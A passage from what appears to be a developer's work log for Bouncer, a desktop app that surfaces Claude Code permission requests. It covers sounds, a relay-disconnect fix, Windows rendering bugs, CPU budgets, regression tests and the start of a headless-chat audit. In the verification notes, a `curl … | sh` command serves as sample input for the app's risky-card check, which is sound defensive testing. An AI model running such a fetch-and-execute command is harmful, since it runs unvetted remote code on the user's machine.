   `SessionEnd`, `UserPromptSubmit`, `PreToolUse`, `PostToolUse`,
   `PermissionRequest`, `Notification`, `Stop`; Claude Code reports a failed
   tool in `PostToolUseFailure`, which we don't install. Adding it changes
   what's written into `~/.claude/settings.json` (an install change).
   **Decided (Charan, 2026-10-06): add it**, with these rules:
   - `install-hooks` shows it in the diff and asks, as now;
     `uninstall-hooks` removes it.
   - A real fixture from a failing command in the playground, user name
     replaced by `dev`.
   - Its error text is never stored or shown unredacted: the log keeps only
     "failed", the island only a short redacted label.
   - Fire-and-forget like the other events: never waits, never answers.
   - Older installs just don't hear the trombone until `install-hooks` is
     re-run; nothing breaks.

   Recorded (2.1.291, `claude-code-2.1.291-PostToolUseFailure-Bash.json`):
   `tool_name`, `tool_input`, `tool_use_id`, `error` (the error text: "Exit
   code 1" plus the command's stderr), `is_interrupt`, `duration_ms`. A call
   refused by a deny rule sends no `PostToolUseFailure` (only its
   `PreToolUse`), so a denial never plays the trombone. Done that way: the
   relay drops `error` with `tool_response` (it never leaves the relay); the
   step gets the tag "failed" in the island (the label is the step, already
   redacted); the log entry's `how` is "failed"; a failure for a card still
   up clears it, like `PostToolUse`. Still to settle with the sound:
   `is_interrupt: true` (Esc) is the user's own stop, so it shouldn't play
   the trombone. The lowest Claude Code version that knows the event isn't
   confirmed (the changelog doesn't name it; it exists in 2.1.288 and
   2.1.291).
5. **Defaults (Charan, 2026-10-06).** On: needs you, risky, done, tool
   failed, welcome back, launch. Off, each turned on in Settings: new
   session, allowed, denied, always allow, auto-allowed, poke, dizzy,
   paused, resumed, auto on, history wiped. (Auto-allowed fires on every
   tool call in auto mode; tool failed can be frequent, but Charan wants it
   on.)
6. **Launch vs the quiet first view.** The greeting runs on the first view
   (`greetUntil`), which is the app's launch. The "yo!" plays on the first
   view; every other first-view sound stays quiet, as now. A reload in dev
   replays it (prod has no reload). **Charan, 2026-10-06:** it follows the
   same rules as every other sound: muted when Sound is off, silent when
   paused. Then (after Verify): it plays at launch whenever Sound is on,
   with or without the greeting, so also with reduced motion (reduced
   motion is about movement, not sound).
7. **Priority when two fire together:** risky, then needs you, then the
   rest; only one plays. The 2-s repeat drop stays; "longest sound" becomes
   the longest in the pack (checked by a test over the recipes, ≤ 1 s).
8. **Paused:** the snore is the pause itself; after it nothing plays until
   resumed (the "bip-bip" is the resume).
9. **Storage:** `preferences.json` gains `volume` (0–100, default 50),
   `style` (`soft` default / `playful`) and `sounds` (name → on / off,
   known names only); `sound` stays the master switch. Unknown or
   out-of-range values give the default, same checked atomic write.

Threats:

| Threat | Fix |
| --- | --- |
| A fun sound masks a risky alert | One sound at a time, risky > needs > rest; alarms keep their buzz and play 5 dB above the rest in Soft |
| Sound spam with many sessions | 2-s repeat drop; frequent events off by default; one at a time |
| Loud surprise | Volume capped (100% = today's level ×2), default 50% |
| Idle CPU / battery | Context suspended after each sound (unchanged) |
| A tampered `preferences.json` | Known names and values only, volume clamped; never security policy |
| Copying sounds | All synthesized from code written here; nothing sampled or copied |

Done when:

- [x] Listen-and-pick board in the prototype: every sound × Soft / Playful,
  each playable, keep / change per cell, a wipe sound picked; every sound
  a keep (Charan, 2026-10-06: all 34 keep, the broom "swish" (C) for
  history wiped; prototype v0.15 records the picks)
- [x] Charan's calls: `PostToolUseFailure` added (rules above); launch
  "yo!" muted with Sound off and silent when paused
- [x] `PostToolUseFailure`: in install / uninstall (diff, confirm, removed
  cleanly, an old install gains only it), fixture recorded, `error` dropped
  in the relay, log `how` "failed", island tag "failed", fire-and-forget
  (fixture relayed silently)
- [x] The app plays the picked pack: style, volume, per-sound on / off in
  Settings, saved in `preferences.json` (live, see Verify)
- [x] Rules hold: one at a time (an alarm cuts a lighter sound), risky >
  needs > rest, 2-s repeat drop, quiet while paused but the snore, six on
  by default, context suspended after each sound
- [x] Tests: recipes ≤ 1 s, the pack equals `preferences.json`'s list,
  priority, repeat drop, gates, prefs parsing, Esc isn't a failure (the
  app's recipes checked equal to the prototype's once, by hand)
- [x] fmt, clippy, tests green locally and in CI; gitleaks rules checked
  (local green: 150 Rust + 51 frontend)

Implement (2026-10-06):

- `src/pack.ts`: the 17 picked recipes and the synth (oscillators,
  filtered noise, envelopes), ported from the board. Checked equal to the
  prototype's recipes once, part by part (2026-10-06); not kept as a test,
  since reading them means evaluating the prototype's script, which the
  no-HTML-sinks guard rightly forbids under `src/`.
- Loudness: each sound in each style is rendered offline once, on first
  use, and played at the gain that brings it to one RMS (alarms +2 dB, the
  rest of Soft −3 dB, the click −6 dB); peaks capped so 100% never clips.
  Volume 50% = that level.
- `src/sound.ts`: `cue` covers launch (first view, only with the greeting),
  paused / resumed (transitions), new card, a session newly asking, a failed
  tool call (the session's new `failed` count), done, new session, the away
  summary, the auto-allowed flash (not "Rules changed"). Clicks play
  directly: Allow / Deny (once the backend took the answer), "Always allow"
  added, auto on, history wiped, poke / dizzy. `play` checks Sound, the
  sound's switch and paused itself.
- Backend: `Event.interrupted` from `is_interrupt`; Esc is not a failure
  (no tag, no count, the log keeps no "failed"); each session's `failed`
  count in the view.
- `preferences.json`: `style`, `volume`, `sounds` (all 17 named); a bitmask
  inside; unknown names and values ignored when read; `set_prefs` refuses
  an unknown size / style / sound or a volume over 100.
- Settings: Sound style (Soft / Playful), Volume (saved when let go), and
  "Which sounds" with one switch each; focus stays on the slider or switch
  after the re-render.

Verify (2026-10-06, Windows, debug app built to a scratch target, own pipe,
rules folder and WebView2 folder, Vite started for it; a test-only spy over
the debug port logged every sound that reached the speakers by its first
pitches; events through the scratch relay):

- Launch: "yo!" once on the first view; the audio context suspended after.
- Defaults: new session silent (off); a failed `cat` → trombone; Esc
  (`is_interrupt: true`) → silence; a card → needs you; Deny → silence
  (off); a `curl … | sh` card → risky; "done" after a turn with work.
- Everything on, Playful, 100%: a card → needs you at ~2× the gain; Allow →
  allowed; a click on Bouncer → boing; a new session → chime.
- Sound off: a new card → silence. `set_prefs` refused "retro", 101 and an
  unknown sound name.
- The failed step shows the red "failed" tag in session detail.
- Settings (page screenshots): style, volume, "Which sounds · 6 of 17 on",
  as the prototype. Keyboard: Space on a switch toggles it and keeps focus
  (7 of 17), arrows move the volume 5 at a time and keep focus;
  `preferences.json` written as expected.
- Idle CPU, settled hidden strip, app + WebView2, 60 s: 484 ms (0.81%),
  audio service 0 ms; the context is suspended between sounds.
- Not by me: pause / resume (tray only), and how it all sounds.
- Diff reread: no HTML sinks; labels are our constants via `textContent`;
  the error text never leaves the relay. The no-HTML-sinks guard caught a
  `new Function` in my first parity test; that test was removed and the
  removal folded into the commit that added it (Charan), so every commit
  on the branch passes the full Rust and frontend tests (run on each).
- Noticed, not 5d: a card whose relay was killed stays up until its wait
  runs out (110 s).

Manual checks (Charan, 2026-10-07, Claude Code 2.1.292, Windows):

- [x] Listen in the app: a card (needs you), `curl … | sh` (risky), a
  finished session (done), `cat` of a missing file (sad trombone): all
  good
- [x] Pause and resume from the tray, with those two sounds turned on
- [x] Sound off, then a card: silence
- Found: in Settings, turning a sound on or off further down the "Which
  sounds" list jumped the list back to the top. The island is rebuilt on
  every change and its scroll box started at 0. Fixed: `render()` keeps
  the scroll position when the same screen (or the same card) is drawn
  again; a new screen or card still starts at the top. Checked on a test
  instance: scrolled to Paused (450 px), two clicks and a Space press, the
  list stayed at 450 px with focus kept; reopening Settings starts at the
  top.
- Found: the yellow focus ring stayed on the island's Close button while
  another window (Claude) had the keyboard. Cause: in WebView2 the page
  always thinks it has focus (`document.hasFocus()` true with Windows
  Terminal in front), so `render()` kept putting focus back after every
  re-render, and the ring is drawn for any focused element; the window's
  `blur` never fires either (a first fix on it didn't work). Windows also
  reports a focus-in at launch while another app is in front, so only the
  backend's own record is trusted: the island has the keyboard from
  `take_keyboard` (gear, tray) until a focus-out or Esc, sent to the page
  as `view.keyboard`. Without it, `render()` lets go of focus and the CSS
  draws no ring (the browser's default one included); with it, focus is
  restored as before, and Deny gets it when the keyboard arrives with a
  card up. Checked on a test instance (no OS focus taken): Close focused,
  then a re-render → nothing focused, no ring; Close focused with no
  re-render → no ring; with the keyboard (class set by hand) → yellow
  ring. Needs Charan: gear / tray → keyboard → ring, then click away.
- Found (Charan, 2026-10-07, second round): (1) a white area beside the
  island's top; (2) with no sessions the idle pill couldn't open the island,
  so Settings was unreachable; (3) the ring on the pill was cut off; and
  asked for every keyboard / focus path checked. Fixed: the pill always
  opens the island ("No sessions yet" and the gear); the ring is drawn
  inside each control's edge (`outline-offset: -2px`), so no edge can cut
  it; a keyboard change only tells the page (no window re-layout). Found by
  the matrix and fixed: Tab skipped the volume and "Which sounds" and could
  land on switches hidden in the closed list; opening a session's detail by
  keyboard left focus nowhere; when the keyboard arrives, focus goes to the
  first control (Deny with a card up).
- (1) reproduced with Charan's steps (2026-10-07): Settings by the gear,
  Tab down, then click another window → a pale band (~22 px) across the
  window's width behind the island's top, staying. Cause: Tao keeps the
  caption style on an undecorated top-level window (hiding it another way),
  and the default handling of `WM_NCACTIVATE` paints the inactive caption
  when the window loses activation; the transparent margin shows it. Not
  the page, and not the frame refresh alone (tried on a never-focused
  window). Root fix, no repaint workaround: a window subclass in
  `region.rs` passes every message on, `WM_NCACTIVATE` with lParam -1
  (Windows then doesn't repaint the non-client area; Tao still sees the
  focus change). If it can't be set up, nothing changes. Before / after
  captures over a black backdrop: band with the old build, none with the
  new; the ring still goes when the window loses the keyboard.
- Found (Charan): after dragging the island to another screen, closing it
  put the wake strip back on the main screen (opening brought the island
  back to the moved spot). The hidden strip always used the primary
  monitor's top centre. Now it's on the screen the island is on, at its top
  edge right above the island; at launch the main screen (the spot is never
  saved). Checked on one monitor (same code path): moved to x=20, closed →
  strip stayed above it (old build: jumped to the top centre); reopened at
  the moved spot. Needs Charan with two screens.
- Found (Charan, third round): (a) clicking back into the island after
  another window had the keyboard didn't give it back, so Tab went to the
  other window; (b) moving the open island and closing it with × sent the
  strip back to the main screen (going through Settings didn't): the drag
  was only noticed while the island stayed shown, and × hid it in the same
  layout; (c) a thin line beside the island's top. Fixed (a): a click on
  the open island takes the keyboard (the pill only opens it); (b): the
  drag is noticed on the layout that hides it too. Checked on a test
  instance at the top-centre spot with real clicks: clicked back on the
  island's title → window in front, keyboard back, focus on the first
  control, Tab moves on; × right after a move → strip stayed at the moved
  spot. (c) not reproduced on the current build with Charan's steps (gear,
  sounds list open, Tab, click away, click back): no bright pixel beside
  the island's top in any capture.
- Found (Charan, fourth round): with another window holding the keyboard,
  the first click on ×, the gear, a switch, Deny or Allow only gave Bouncer
  the keyboard; a second click was needed. Cause (`57b3c1c`): pressing the
  mouse asked for the keyboard, the backend sent a new view and the island
  was rebuilt before the button was released, so the click had no target.
  Fixed (`cd42ca5`): when only the keyboard state changes, nothing is
  rebuilt (only the ring class and focus), so the pressed button stays.
- End-to-end with real clicks (2026-10-07, test instance over a black
  backdrop, every first-click case starting with a real click on another
  window so Bouncer doesn't hold the keyboard; Allow before the arm clicked
  by a pre-warmed clicker 231 ms after the card appeared):

  | Check | Result |
  | --- | --- |
  | Launch: strip at the main screen's top centre | pass |
  | Pill click opens the list, first click | pass |
  | × on the list: one click closes | pass |
  | Gear: one click opens Settings | pass |
  | Settings switch: one click flips it | pass |
  | × on Settings: one click closes it | pass |
  | Card armed: one click on Deny denies (relay printed deny) | pass |
  | Card armed: one click on Allow once allows (relay printed allow) | pass |
  | Card before 600 ms: a click on Allow doesn't allow (no answer; Deny then gave deny) | pass |
  | Focus never lands on Allow by itself (Deny after the early click) | pass |
  | Strip after a drag and close: above where the island was (centre 398 = island centre) | pass |
  | No line after launch / after the pill click | pass |
  | No line after the first drag after launch | **fail**: follow-up |

- The line: 1 px, #EAEAEA, 30 px below the window's top, across the whole
  window region beside the island; only after the window's first
  activation after launch, by a drag (a second drag, or a drag after other
  activations, leaves none). The page doesn't draw it (its own render is
  clean outside the island). Not `WM_NCACTIVATE` (already lParam -1), not
  `WM_NCPAINT` (swallowed: still there), not DWM non-client rendering
  (`DWMNCRP_DISABLED`: still there); both experiments reverted. Its own PR
  after #14 (Charan, 2026-10-07).

Keyboard / focus matrix (2026-10-07, test instance beside Charan's dev app,
keys sent to the page over the debug port, real clicks only on the test
window and a black backdrop; screenshots per state):

| State | Tab / Shift+Tab, stays in | Ring whole | Enter / Space | Esc | Click away | Focus lands |
| --- | --- | --- | --- | --- | --- | --- |
| No sessions | pass (gear ↔ ×) | pass | pass: pill opens; gear → Settings; × closes | pass | — | gear |
| Idle pill | n/a (not a stop) | n/a | pass: click opens the list | n/a | — | n/a |
| Session list | pass (rows, gear, ×) | pass | pass: row → detail | pass | — | first row |
| Session detail | pass | pass | pass: × → list | pass | — | × (fixed) |
| Settings | pass (28 stops) | pass, on screen too | pass: switches, style, list, volume | pass | pass (real click) | Small (real gear click) |
| Auto-allow confirm | pass | pass | pass: Enter never turns on; Esc closes it only | n/a | — | Cancel |
| Normal card | pass | pass | pass: Enter on Allow never approves; Deny denies | pass (card stays) | — | Deny |
| Risky card | pass | pass | pass: no Always allow, Deny filled | pass | — | Deny |
| Two cards | pass | pass | pass: next card's Deny | pass | — | Deny |
| Away summary | pass | pass | — | pass | — | first row |
| Paused | by hand (tray only) | | | | | |
| Open from the tray | by hand (two Bouncer icons in the tray) | | | | | |

- [ ] Settings by keyboard and with a screen reader
- [x] Launch with reduced motion: Charan, 2026-10-06: the "yo!" plays
  anyway (whenever Sound is on); changed

## Relay disconnect fix (after 5d, before 6)

Charan, 2026-10-06. Its own small PR, right after 5d is merged. Found in
5d's Verify: a card whose relay is gone (Claude Code killed the hook, or
the user answered in the terminal and the hook was stopped) stays in the
island until its wait runs out (110 s).

- When a relay's connection closes before its card is answered, drop the
  card at once. No answer is sent (nobody is listening; Claude Code
  already asks in its terminal). The session shows "asked in terminal" /
  "answered in terminal" as today.
- Never the other way round: a card is never answered, armed or moved
  because of a disconnect; an answer that races the close is simply not
  delivered.
- A test: a permission request whose client closes mid-wait leaves the
  queue well before the wait (e.g. under 1 s), and nothing is written back.
- Audit to settle: how the waiting connection notices the close on both
  ends (Windows pipe: a read returning broken pipe / EOF; macOS socket:
  EOF), without a busy loop and without changing the relay; and which
  history tag the session gets.

### Relay disconnect audit (2026-10-07)

Sources: `ipc.rs` (`handle`, both servers), `approvals.rs` (`Desk::handle`,
`take`, `drop_stale`), the relay's `talk`, `crates/relay/tests/relay.rs`.

- Today a waiting card ends only by an answer, a stale-card event
  (PostToolUse of the same call, Stop, a new prompt, the session's end) or
  the 110 s wait. A relay that's gone isn't noticed.
- Removing a card from the queue already wakes its waiter at once with no
  answer (its channel's sender is dropped): that's how stale cards leave.
  So the fix is only noticing the hang-up while waiting.
- Noticing it: the waiting thread is the connection's own thread, which
  later writes the answer. A blocking read in another thread would hold up
  that write on Windows (synchronous pipe I/O on one handle is serialized),
  so the check is non-blocking and made by the waiting thread: Windows
  `PeekNamedPipe` (fails once the client is gone), macOS a non-blocking
  `peek` (0 bytes = closed). The desk waits in 200 ms slices and checks
  between them; no busy loop, nothing runs while no card is up.
- The handler gets the event and that check (`Handler` changes; the relay
  doesn't). Any check failure counts as gone: the card leaves with no
  answer, so Claude Code's own prompt decides (fail safe).
- A gone relay ends the card as "answered in terminal" (the relay only
  closes early when Claude Code stops the hook). The session's status
  after it: settled by the playground check below.
- To check with a real session (Charan): with the card up, answer No (and
  separately Yes) in Claude Code's own prompt. Does Claude Code stop the
  relay? If yes: the card leaves at once, "answered in terminal", Idle
  after a No, working after a Yes; a recorded fixture and a test. If no:
  logged next to the Phase 4 limit. A No after the card already timed out
  stays as it is ("Waiting in terminal" after 2 minutes).

| Threat | Fix |
| --- | --- |
| A live relay's card dropped by mistake | Only a failed peek / EOF counts; no answer is ever sent for it (Claude Code asks) |
| The check delays a real answer | Same thread, non-blocking; an answer wakes the waiter at once as before |
| Idle CPU | Checks only while a card waits, 5 a second |

Done when:

- [x] Killing the relay mid-request: the card leaves within a second, the
  step reads "answered in terminal", nothing is answered (test: 203 ms)
- [x] Answers still reach the relay as before (existing tests; real clicks)
- [x] Playground: No / Yes in Claude Code's prompt with the card up
  (fixtures + tests)
- [x] fmt, clippy, tests green locally and in CI (Windows and macOS: the
  macOS job runs the kill test against the socket check); gitleaks rules
  checked (local: 155 Rust + 51 frontend)

Playground (Charan, 2026-10-07, Claude Code 2.1.293): with the card up, No
and Yes in Claude Code's own prompt (keyboard and mouse) both made the card
leave at once: Claude Code stops the hook, so the relay hangs up. Recorded:
after a No, nothing more comes for that tool (no PostToolUse, no Stop; a
`permission_prompt` Notification, then nothing until the next prompt);
after a Yes, the tool's PostToolUse and then Stop. Two problems in that
first build: after a No the session still read "Running mkdir test-no", and
the No and the Yes looked the same (a green check, "answered in terminal").

Fixed: the step settles in three words, never "denied" (Bouncer can't tell
a No from a Yes until something runs):

- the relay hangs up → "answered in terminal", a neutral icon (grey ring);
  the session counts as working meanwhile;
- the same call's PostToolUse comes → "allowed in terminal", green check;
- nothing for it within 5 s (the 2-s tick: 5–7 s), or the next prompt / Stop
  first → "not run (answered in terminal)", grey dash; the session is idle
  and reads "Waiting for you", not "Running".

A long command allowed in the terminal only reports when it ends: shown
"not run" at 5 s, it turns "allowed in terminal" when its PostToolUse comes
(until the next prompt). A card already timed out and answered No later
stays as before ("Waiting in terminal" after 2 minutes). Fixtures:
`claude-code-2.1.293-no-in-terminal.jsonl`, `-yes-in-terminal.jsonl`.

Real clicks (2026-10-07, test instance beside Charan's dev app, black
backdrop, the guard as before):

| Check | Result |
| --- | --- |
| Allow from the island answers the card (relay: allow) | pass |
| Deny from the island answers the card (relay: deny) | pass |
| Two cards: one relay hangs up → only that card leaves (130 ms) | pass |
| …the other card still answers (relay: deny) | pass |
| Live relay never dropped: card up at 30, 60, 90 s | pass |
| The wait still ends in the terminal: relay ended at 100.1 s, nothing printed, logged "asked in terminal" (the wait is 100 s: the relay's 110 s budget minus 10, unchanged) | pass |
| Auto-allowed request: no card, allowed in 21 ms | pass |
| Paused requests | unchanged path (returns before any wait); unit test; tray only, not clicked |
| Idle CPU, no card, 60 s: 0.31%; the check only runs while a card waits (with one: the app process 31 ms in 30 s) | pass |

Found, not this PR: with a card up the WebView uses about half a core
(15 s of CPU in 30 s): the waiting card's animations, drawn every frame.

## Line after the first drag (after the relay fix, before 6)

Charan, 2026-10-07. Its own small PR from the 5d finding above: a 1-px
light line beside the island after the first drag after launch. Same
native-code rules: only in `region.rs`, fail safe. In the same PR, a
separate commit: a step whose tool failed got the green check.

### Line audit (2026-10-07)

Sources: `region.rs` (`no_caption`, the subclass), Tao's window
procedure (undecorated windows keep `WS_CAPTION`), the 5d findings.

Reproduced on a fresh test instance (black backdrop, real clicks): pill,
then drag the title. The line is at window y 30 in every run (2 of 2 today
plus the 5d runs), whatever row the drag grabs (y 30 and y 38: still
y 30), so it belongs to the window, not the cursor. Window, client and the
WebView's child windows have the same rect before and after the drag
(window tree dumped both times), so it isn't a misplaced child. It clears
when the island re-lays out (a new region).

Cause: the window keeps `WS_CAPTION` (style `14C80000`), and y 30 is that
hidden caption's height. The first mouse-down on it (the drag's
`WM_NCLBUTTONDOWN`) makes the visual-styles engine paint the caption and
frame itself with two undocumented messages, `WM_NCUAHDRAWCAPTION` (0xAE)
and `WM_NCUAHDRAWFRAME` (0xAF), not `WM_NCPAINT`. That explains why
swallowing `WM_NCPAINT` and disabling DWM non-client rendering did
nothing. Its bottom edge lands in the transparent margin. Proof: answering
both messages with 0 in the existing subclass removes the line (3 of 3
fresh launches, 0 light pixels); the same runs without it showed the line
every time.
Chromium answers the same two messages the same way for its frameless
windows.

| Threat | Fix |
| --- | --- |
| Something else stops drawing | Only those two messages; the window has no visible caption or frame to draw |
| Drag or activation breaks | Hit-testing and the move loop are other messages, unchanged (drag checked) |
| Setup fails | As before: no subclass, nothing changes (the line can come back, nothing else) |

Done when:

- [x] Fresh launch → pill → first drag: no line (3 of 3; before: every run)
- [x] A later drag: no line; the drag still moves the window
- [x] The white band after losing the keyboard stays fixed (0 light pixels)
- [x] A failed step gets its own amber warning icon, never the green
  check (frontend test; prototype v0.18)
- [x] fmt, clippy, tests green locally and in CI; gitleaks rules checked
  (local: 156 Rust + 52 frontend)

## Card CPU (after the cleanup, before 6)

Charan, 2026-10-08. Found in #15: with a card up the WebView used about
half a core. Audit first, measure before and after (60 s, card up), keep
the look the same, honour reduced motion.

### Card CPU audit (2026-10-08)

Sources: `ball.ts` (frame loop, `draw`), `motion.ts` (`moving`, `pose`),
`styles.css` (animations). Measured on the test instance (Intel HD 620,
GPU compositing on), CPU of the app and its WebView2 processes.

- What redraws: Bouncer's frame loop. `moving()` is always true for the
  working, needs-you, risky and dance moods, so `requestAnimationFrame`
  runs at 60 Hz the whole time (needs-you even between its hops). CSS
  animations are not it: the arm bar is one-shot, the spinner only shows
  in the detail view, the caret steps once a second.
- Why it costs so much: `draw` set SVG `transform` attributes, which makes
  Chromium lay the SVG out again every frame (1,312 layouts in 20 s), then
  repaint and recomposite. Moving those to CSS transforms on the same SVG
  children changes nothing (still a layout each frame).
- The floor: in this transparent window any 60 fps change costs about 25%
  of a core in the GPU process, even a 4-px compositor-only box; driven
  from `requestAnimationFrame`, about 46% in all. Under it only by drawing
  fewer frames, which changes how smooth he moves (not done; Charan's
  call).
- Fix: three stacked SVG boxes with the same viewBox (shadow, body, the
  "z" and "!"). The body and the shadow are HTML boxes on their own
  compositor layers (`will-change`), moved with CSS transforms about the
  same points (16, 29) and (16, 30); the face's in-SVG transforms change
  only when he looks, blinks or gets dizzy. Every write is skipped when
  its value hasn't changed. No layout per frame (4 in 20 s).

| Case (60 s) | Before | After |
| --- | --- | --- |
| Working, no card | 71.8% of a core | 45.3% |
| Normal card (needs you) | 64.3% | 43.3% |
| Risky card | 59.0% | 44.4% |
| Card, reduced motion | 0.65% | 0.34% |
| (Option, not done: 30 fps, normal card) | | 28.9% |

Look: a frozen copy of live frames beside the old single-SVG drawing of
the same pose, compared pixel by pixel. Same place at the best alignment
(offset 0) in every frame, rotated "done" hops included; at rest the same
to the eye (mean difference 6 of 765 per lit pixel). Frames where he is
stretched or tilted are a touch softer at the 26-px size (a layer is
resampled, not redrawn: mean 30 of 765), the same at 72 px.

| Threat | Fix |
| --- | --- |
| He looks different | Same points and units (test reads the origins from styles.css); pixel comparison above |
| Reduced motion | Unchanged path: no frames, the still pose (checked: holds still) |
| Clicks and looking break | The click and the cursor use the wrapper (checked: squish, no island open; looks at the cursor) |

Done when:

- [x] No layout per frame while he moves (1,312 → 4 in 20 s)
- [x] Card up 60 s: CPU before and after measured (table)
- [x] Same look: pixel comparison; reduced motion still
- [x] fmt, clippy, tests green locally and in CI; gitleaks rules checked
  (local: 158 Rust + 53 frontend)

## Motion budget (after card CPU, before 6)

Charan, 2026-10-08: 45% of a core while a session just works is too much
for an app that runs for hours. Bouncer moves in short bursts, then holds
still, so the frame loop is stopped most of the time. Targets (60 s, app +
WebView): working with no card under 5%, card up under 8%, idle under 1%.

### Motion budget audit (2026-10-08)

Sources: `motion.ts` (`moving`, `step`, `pose`), `ball.ts` (frame loop,
timers, cursor), `styles.css` (every `animation`).

- The loop runs while `moving()` is true; working, needs you and risky
  made it true forever (dance too: unused until Phase 8, left as it is).
- Infinite CSS: the current step's spinner and the code pane's caret.
  The arm bar runs once; the pill and the focus ring have no animation.
- Fix (all in `motion.ts`, tested without a DOM): a new mood moves for a
  burst (working two jumps, needs you one pair of hops, risky one puff,
  idle one breath; done and the greeting end by themselves), then
  `moving()` is false and the pose holds. `gesture()` gives one small
  hop (working, 4 units), one hop (needs you) or one 0.9-s puff (risky);
  `ball.ts` calls it every 8–12 s. A settled squash spring snaps to rest,
  so a stopped loop stays stopped. He looks at the cursor only within
  120 px, so the look eases once and stops. Spinner: 3 turns; caret: 4
  blinks. Reduced motion: unchanged (no frames, no gestures, the still
  pose). Prototype v0.19 matches (Build spec: Motion).

| Case (60 s) | Before (main, v0.5.8) | After |
| --- | --- | --- |
| Working, no card | 41.2% of a core | 4.0% (3.6 / 4.3 / 4.2) |
| Normal card (needs you) | 37.7% | 4.7% (4.7 / 4.6) |
| Risky card | 37.8% | 4.7% |
| Idle | 3.9% | 0.5% |
| Card, reduced motion | 0.3% | 0.3% |

| Threat | Fix |
| --- | --- |
| A card goes unnoticed | It still hops (a pair) or puffs when it appears; the sound and the "!" are unchanged; then a hop every 8–12 s |
| The loop restarts by itself | Spring snaps to rest; test: still after the burst, and time passing changes nothing |
| Reduced motion | Same path as before: no frames, no gestures |

Done when:

- [x] Each mood: one burst, then the loop stops (test)
- [x] Gestures under ~1 s, loop stopped in between (test; CPU table)
- [x] No CSS animation left running forever on the island
- [x] Targets met: working 4.0% (< 5), card 4.7% (< 8), idle 0.5% (< 1)
- [x] fmt, clippy, tests green locally and in CI; gitleaks rules checked
  (local: 158 Rust + 56 frontend)

Hand check of #19 (2026-10-08, test instance and black backdrop, real
cursor and clicks behind the guard). "Loop ran" = seconds with frames
(style recalcs > 10 that second):

| Check | Result |
| --- | --- |
| Working: one burst, then still, a gesture every 8–12 s | `##..#........#.........#........##......` (7 of 40 s); 4.2% of a core over 60 s |
| A card: hops on arrival, then every 8–12 s | `##..#......##.........#.......` (6 of 30 s); 2.4% over 60 s |
| Cursor within 120 px | 95 recalcs while it moved (1.2 s), 29 easing in the next 1 s, 0 in the 2 s after: loop stopped |
| Long step (`ping -n 30 localhost`) | turned 2.4 s, then stuck as a still ring: looked frozen |

Fixed: after its three turns the spinner settles into a still "running"
mark (sun disc, three dots; at once under reduced motion; prototype v0.20).
The first try named its keyframes `running`, a CSS keyword (the play
state), so it never ran; found by this check, now guarded by the test. On
the rerun (real clicks): settled at 2.4 s, still afterwards.

## Regression gate (after the motion budget, before 6)

Charan, 2026-10-08: every scenario Bouncer supports listed and proven, so
nothing breaks going forward. The list is `docs/TESTS.md`; CI runs every
automated row on Windows and macOS and `scripts/check-tests.mjs` fails a PR
whose table names a test that doesn't exist.

### Regression gate audit (2026-10-08)

Mapped the 159 Rust and 57 frontend tests to the scenarios. Unproven:
the app dying with a card up, the wait budgets' order, re-install from a
new place, a dropped session coming back, install touching only its
target, two cards from one session, the CSP and the window's commands, a
burst of simultaneous hooks, a second launch. Each got a test; the real-
click rows were run on the test instance. Three bugs, each shown failing
first, then fixed in its own commit (a fourth came from review):

1. **Events lost in a burst of hooks** (the flaky
   `two_sessions_stream_while_one_waits_for_a_decision`). Cause: a
   fire-and-forget relay exited right after writing; the app checks who
   sent an event before reading it, and when the relay was already gone the
   event was lost. Under load the app's thread starts later, so it was
   flaky (1 in 20 under full CPU load). A new test sends 32 relays at once:
   26–31 of 32 arrived (3 in 6 runs failed, still missing after 5 s). Fix:
   the relay waits for the app to close the connection (bounded by its
   2-s fire-and-forget budget); 0 in 20 failed after, full suite 5 times
   clean. No timeout raised.
2. **A second launch stayed as a dead island**: the pipe was taken, so it
   logged a line and kept a second island and tray icon that never heard
   anything. Shown on the test instance (main's build: still running after
   8 s). Fix: if the endpoint is taken by this user's Bouncer, the second
   launch quits at once; the first keeps working (checked).
3. **An empty away summary**: sessions that only started or stopped opened
   "While you were away" with all zeros. Fix: no tool call and no request
   means no summary (test).

4. **The tray wiped history in one click** (Charan, after review): its
   "Wipe history" deleted at once, no confirm, beside Pause and Quit. Now
   "Wipe history…" opens Settings at its existing confirm (Cancel first,
   the armed "Delete history"); the only wipe is that button. Tests: one
   wipe path in the app (it fails with a second one), and the page's wipe
   only on the armed button; checked on the test instance (page-level);
   the tray click itself is hand check 2.

Decided (Charan, 2026-10-08): the live island keeps showing commands
exactly as sent, secrets included (you approve what you see; nothing is
written; the log and the away summary are redacted). `docs/TESTS.md` L5.

Done when:

- [x] `docs/TESTS.md`: 83 scenarios, 74 automated in CI, 5 real-click only
  (run 2026-10-08), 2 hand checks (passed 2026-10-08, Charan); Narrator and
  M3 (a real Mac) wait for Phase 9
- [x] Every row with no proof got a test, or a real-click run, or a hand check
- [x] CI checks every named test exists, on Windows and macOS
- [x] The flaky relay test: cause found, shown failing, fixed without
  raising a timeout
- [x] fmt, clippy, tests green locally and in CI; gitleaks rules checked
  (local: 168 Rust + 57 frontend; CI: 172 Rust on macOS, the gate on both)

## Phase 6 — Chat in the island (~1.5 weeks) (current)

- **Audit:** Claude Code's headless mode (`claude -p`): flags, output formats,
  session reuse, permission modes, how it authenticates (the user's own login, no
  API key, $0); which hooks fire in a headless session (Bouncer's own hooks will
  see it); how to cancel and time out a run.
- **Implement:** a chat panel in the island; each message runs the user's local
  `claude -p` as a child process (exec form, no shell, prompt on stdin, never in
  argv); streamed answer shown with `textContent`; locked-down tool permissions
  for chat runs; cancel button; clear "this runs your Claude Code" note.
  (The audit below replaces the details: one live process per chat.)
- **Model picker** (Charan, 2026-10-03): chooses the model for chat runs,
  passed with `claude -p`'s model option (exact flag confirmed in the Audit),
  from a fixed list, never free text into argv. Default: the user's own
  Claude Code default (no model flag). Bouncer never changes the model of a
  user's Claude Code session or their Claude Code settings.
- **Test:** prompt with shell metacharacters stays literal; hostile model output
  renders inert; cancel and timeout kill the child; `claude` missing → clear message.
- **Verify:** Bouncer itself makes no network calls; no API key read or stored;
  chat history kept only if the user opts in, redacted like the activity log.

### Phase 6 audit (2026-10-08, decisions 2026-10-09)

Checked on Claude Code 2.1.295 (the npm install's native `claude.exe`) against
`claude --help`, the CLI reference, the headless, sessions and env-vars docs,
and five real runs in `../bouncer-playground` and an empty scratch folder
(read-only tools, Haiku, then one run with no `--model`; this session's own
`CLAUDE_*` variables removed first).

**Plan corrections**

- "Its requests still go through Bouncer" is wrong. With the locked flags
  below a chat run reads no settings files, so no hooks fire (none were
  recorded) and nothing ever prompts: what it may not do is denied by Claude
